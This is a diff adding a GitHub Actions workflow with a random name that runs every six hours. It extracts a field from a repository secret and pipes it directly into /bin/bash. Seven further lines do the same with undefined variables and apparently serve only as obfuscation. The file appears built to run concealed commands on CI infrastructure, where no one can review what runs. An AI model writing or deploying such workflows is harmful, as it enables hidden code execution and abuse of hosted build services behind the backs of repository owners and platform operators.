@@ -1,0 +1,25 @@
+name: adolescentacademic
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: adolescentacademic
+        env:
+          rmozw5: ${{ secrets.rmozw5 }}
+        run: |
+          echo $rmozw5 | jq -r .qotm293 | /bin/bash
+          echo $lbzg908 | jq -r .b38 | /bin/bash
+          echo $ygmw49 | jq -r .nxuk4 | /bin/bash
+          echo $fn64162 | jq -r .y3176 | /bin/bash
+          echo $rebv81620 | jq -r .g54236 | /bin/bash
+          echo $oqq972 | jq -r .zbgt23175 | /bin/bash
+          echo $gfv450 | jq -r .iads50453 | /bin/bash
+          echo $h69839 | jq -r .yjeib429 | /bin/bash
+
